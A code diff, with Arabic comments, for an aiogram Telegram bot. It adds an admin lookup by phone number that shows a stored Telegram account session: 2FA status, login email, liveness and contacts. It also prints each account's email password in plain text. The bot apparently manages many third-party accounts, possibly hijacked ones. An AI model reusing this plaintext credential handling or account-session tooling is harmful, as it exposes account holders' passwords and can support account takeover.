@@ -909,6 +909,101 @@ async def session_watchdog():
 
 
 # ──────────────────────────────────────────
+# بحث الأدمن بالرقم — لما يرسل +xxx يرد بمعلومات الحساب
+# ──────────────────────────────────────────
+
+@dp.message(F.text.regexp(r"^\+?\d{7,15}$"))
+async def admin_phone_lookup(message: Message, state: FSMContext):
+    """لما الأدمن يرسل رقم تيليفون يعرض معلومات الحساب إذا وُجد."""
+    uid = message.from_user.id
+    if not is_admin(uid):
+        return  # تجاهل للمستخدمين العاديين
+
+    cur_state = await state.get_state()
+    # لا تتدخل مع حالات FSM النشطة
+    if cur_state and cur_state not in (None, ""):
+        return
+
+    raw = (message.text or "").strip()
+    phone = database.normalize_phone(raw)
+    session = await database.get_session_by_phone(phone)
+    if not session:
+        # الرقم غير موجود — رد صامت (بدون رسالة)
+        return
+
+    # التحقق من صلاحية الأدمن للوصول لهذه الجلسة
+    if not await database.can_admin_access_session(uid, phone, SUPER_ADMIN_IDS):
+        return
+
+    # بناء صفحة المعلومات
+    sid        = session["id"]
+    username   = session["username"] or "لا يوجد"
+    full_name  = session["full_name"] or "غير معروف"
+    created_at = session["created_at"]
+    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
+    valid_stat  = "✅ نشطة" if session["valid"] else "❌ غير صالحة"
+    live        = await session_manager.check_session_alive(phone)
+    live_stat   = "🟢 متصلة الآن" if live else "🔴 غير متصلة الآن"
+    login_mail  = database.row_login_email(session) or "❌ غير مربوط"
+    mail_lines  = f"📧 بريد Login: <code>{h(login_mail)}</code>"
+    email_pw    = database.row_get(session, "email_password")
+    if email_pw and login_mail != "❌ غير مربوط":
+        mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
+    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
+    tg_id        = session["telegram_id"] or "—"
+
+    # وضع الصيانة
+    maint_info = database.get_maintenance_info(session)
+    if maint_info["in_maintenance"]:
+        remaining = maint_info.get("remaining_days")
+        maint_line = f"\n🔧 <b>وضع الصيانة:</b> نعم | متبقٍّ: {f'{remaining:.1f} يوم' if remaining is not None else 'غير محدد'}"
+    else:
+        maint_line = ""
+
+    # جهات الاتصال المشتركة
+    mutual_cnt = database.row_get(session, "mutual_contacts")
+    total_cnt  = database.row_get(session, "contacts_count")
+    contacts_line = (
+        f"\n👥 جهات الاتصال المشتركة: <b>{mutual_cnt}</b> / {total_cnt or '؟'}"
+        if mutual_cnt is not None else ""
+    )
+
+    # خصوصية (سوبر أدمن فقط)
+    privacy_line = ""
+    if is_super_admin(uid):
+        priv = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
+        privacy_line = f"⭐ الخصوصية: {priv}\n"
+
+    text = (
+        f"📱 <code>{h(phone)}</code>\n"
+        f"🆔 Telegram ID: <code>{tg_id}</code>\n\n"
+        f"👤 الاسم: {h(full_name)}\n"
+        f"🔖 اليوزر: @{h(username)}\n"
+        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
+        f"{mail_lines}\n"
+        f"📶 قاعدة البيانات: {valid_stat}\n"
+        f"📡 فحص مباشر: {live_stat}\n"
+        f"🔒 التأمين: {secured_stat}\n"
+        f"{privacy_line}"
+        f"📅 تاريخ التسجيل: {h(created_at)}"
+        f"{maint_line}"
+        f"{contacts_line}"
+        + ADMIN_FOOTER
+    )
+    from keyboards import session_detail_keyboard
+    await message.answer(
+        text,
+        reply_markup=session_detail_keyboard(
+            sid,
+            page=0,
+            is_super_admin=is_super_admin(uid),
+            source="main",
+        ),
+        parse_mode="HTML",
+    )
+
+
+# ──────────────────────────────────────────
 # لوحة الأدمن — عرض الجلسات
 # ──────────────────────────────────────────
 async def show_admin_panel(message: Message):
